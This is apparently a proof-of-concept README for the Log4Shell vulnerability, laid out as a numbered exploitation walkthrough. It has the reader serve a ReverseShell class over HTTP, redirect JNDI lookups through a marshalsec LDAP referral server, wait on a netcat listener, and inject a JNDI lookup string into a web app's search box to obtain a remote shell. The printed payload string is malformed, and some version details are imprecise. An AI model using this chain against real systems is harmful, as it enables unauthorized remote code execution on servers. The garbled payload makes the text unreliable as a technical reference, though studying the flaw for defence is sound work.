# Log4Shell-PoC
A Log4Shell Proof of Concept (PoC)

This repository contains a proof of concept (PoC) for the Log4Shell vulnerability (CVE-2021-44228), one of the most critical security issues of the modern internet, that affects Java Apache Log4j library through versions 2.0-2.14.0. Log4Shell allows trivial remote code execution which has generated significant attention in the security community. This PoC is provided for educational and testing purposes to help understand the vulnerability and its potential impact.

**Disclaimer:** This PoC should only be used in controlled environments for educational and defensive purposes. Unauthorized use of this PoC to exploit or cause harm is illegal and unethical.

This guide will explain how to set-up and execute a PoC, please use it responsibly.

1. Deploy the vulnerable Java application (SearchWeb) locally using your preferred technology, e.g. Apache Tomcat, Jetty, Docker image, etc.

2. Start Http server to host the ReverseShell.java that will be loaded in the vulnerable web application (SearchWeb). This can be done easily with python HTTP module as follows:
```
  python3 -m http.server 8000
```
3. Set-up and LDAP referral that will point to the Http server previosuly configured. LDAP by its own cannot serve Java files, therefore LDAP requests will be redirected to our Http server so the ReverseShell.java can be delivered successfully. In order to set this up, we can use the marshalsec utility provided at https://github.com/mbechler/marshalsec with the following command:
```
  java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndiLDAPRefServer "http://192.168.1.2:8000/#ReverseShell"
```
Thiw will redirect all incoming requests to our LDAP to the ReverseShell.class resource hosted on the Http server.

4. Set-up a netcat listener on port 443 to await the connection from the reverse shell. For this, we can use the Netcat (nc) tool:
```
  nc -lvnp 443
```
5. Delivery of the attack vector: Now if we browse to the path /SearchWeb of our vulnerable application, we will see a search box. Whatever we submit in this search box will be logged by the application, therefore, we can introduce here the attack vector:
```
  ${jndi:ldap//192.168.1.2/ReverseShell)
```
After this text is sent, we will see our LDAP server has received an incoming request that has been forwarded to the Http server, and this has served the ReverseShell.class to the vulnerable application. Having a look at our netcat listener we see the incoming TCP connection from the IP of the web application, meaning we have gained RCE on the server hosting the application.
